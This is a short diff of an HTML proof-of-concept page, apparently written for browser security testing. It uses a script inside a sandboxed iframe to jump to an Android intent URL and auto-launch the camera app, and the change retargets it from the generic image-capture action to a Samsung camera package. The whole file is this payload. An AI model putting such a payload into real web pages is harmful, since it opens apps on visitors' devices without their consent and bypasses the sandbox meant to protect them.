@@ -1,13 +1,5 @@
-<!DOCTYPE html>
-<html>
-  <body>
-    <h3>PoC: Camera App Auto-Launch via Sandboxed Iframe</h3>
-
-    <iframe sandbox="allow-scripts" srcdoc="
-      <script>
-        location.href = 'intent://android.media.action.IMAGE_CAPTURE#Intent;scheme=android-app;end';
-      </script>
-    "></iframe>
-
-  </body>
-</html>
+<iframe sandbox="allow-scripts" srcdoc="
+  <script>
+    location.href = 'intent://com.sec.android.app.camera#Intent;scheme=android-app;end';
+  </script>
+"></iframe>
